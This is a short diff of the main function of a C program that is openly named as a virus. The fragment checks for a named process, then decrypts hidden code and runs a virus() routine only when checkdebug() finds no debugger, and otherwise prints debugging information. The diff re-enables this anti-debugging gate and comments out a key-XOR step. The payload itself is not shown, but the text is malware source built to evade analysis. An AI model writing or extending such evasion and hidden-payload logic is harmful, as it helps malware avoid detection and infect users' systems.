@@ -159,16 +159,13 @@ __start int main(void){
 		cmp[2] = 's';
 		cmp[3] = 't';
 		cmp[4] = '\0';
-		environ[1]='\0';environ[2]='\0';
-		environ[0]='?';debug(environ);
 		if (checkproc(cmp) == FALSE){
-				environ[0]='!';debug(environ);
 				return FALSE;
 		}
-		((unsigned char *)key)[0] ^= 0b01110010;
-		//if (checkdebug() == 0)
-		return decryptHiddenCode() && virus();
-		//else
-		//		print_debugging();
+		//((unsigned char *)key)[0] ^= 0b01110010;
+		if (checkdebug() == 0)
+			return decryptHiddenCode() && virus();
+		else
+				print_debugging();
 		return (0);
 }
